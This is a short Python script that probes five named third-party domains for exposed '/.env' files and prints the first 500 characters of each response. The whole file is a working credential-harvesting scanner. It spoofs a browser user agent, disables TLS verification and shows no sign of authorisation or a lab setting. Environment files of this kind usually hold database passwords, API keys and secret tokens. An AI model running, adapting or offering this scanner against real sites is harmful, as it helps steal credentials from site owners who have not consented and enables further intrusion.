import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

targets = [
    "https://www.u--x.com/.env",
    "https://www.visi-x.com/.env",
    "https://www.xn--75x.com/.env",
    "https://www.k--x.com/.env",
    "https://www.z--x.com/.env"
]

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}

print("Verifying .env leaks...\n")

for url in targets:
    print(f"[*] Checking {url}...")
    try:
        resp = requests.get(url, headers=headers, verify=False, timeout=5)
        print(f"  Status: {resp.status_code}")
        print(f"  Length: {len(resp.content)}")
        print("  Preview:")
        print(resp.text[:500])
        print("-" * 50)
    except Exception as e:
        print(f"  Error: {e}")
